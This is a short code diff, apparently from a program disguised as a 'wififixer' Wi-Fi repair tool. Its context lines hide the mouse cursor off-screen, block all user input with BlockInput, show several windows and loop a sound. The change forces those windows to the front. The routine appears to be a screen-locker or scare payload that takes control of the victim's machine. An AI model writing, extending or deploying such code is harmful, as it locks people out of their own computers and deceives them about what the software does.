@@ -180,8 +180,11 @@ namespace wififixer {
 				SetCursorPos(99999999, 99999999);
 				BlockInput(true);
 				form1->Show();
-				form3->Show();
+				form1->BringToFront();
 				form4->Show();
+				form4->BringToFront();
+				form3->Show();
+				form3->BringToFront();
 				PlaySound(MAKEINTRESOURCE(3), GetModuleHandle(NULL), SND_RESOURCE | SND_LOOP | SND_ASYNC);
 				loading::Hide();
 			}
